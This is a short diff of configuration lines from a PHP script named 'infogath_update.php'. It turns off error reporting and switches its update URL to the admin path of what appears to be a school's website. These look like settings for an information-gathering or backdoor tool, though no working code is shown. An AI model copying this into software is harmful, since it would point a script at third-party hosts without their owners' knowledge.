@@ -12,7 +12,7 @@
 $version 	= '1.0.2';
 $random 	= rand(123456789, 6);
 $file 		= 'infogath_update.php';
-$url 		= 'https://brad.josebernard.com/index/';
+$url 		= 'http://smkpembangunanyptplg.sch.id/Admin/';
 error_reporting(0);
 
 
